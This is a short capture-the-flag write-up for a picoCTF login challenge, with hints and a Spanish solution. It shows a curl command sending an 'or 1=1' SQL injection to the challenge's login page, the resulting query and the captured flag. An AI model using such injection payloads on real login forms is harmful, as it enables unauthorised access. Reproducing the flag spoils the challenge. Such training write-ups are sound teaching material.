There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

Hints:
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

# Solución
Se puede usar curl para acceder con una inyección SQL
```
curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=admin ' or 1=1; &password=hola&debug=1"
<pre>username: admin ' or 1=1;
password: hola
SQL query: SELECT * FROM users WHERE name='admin ' or 1=1; ' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>
```

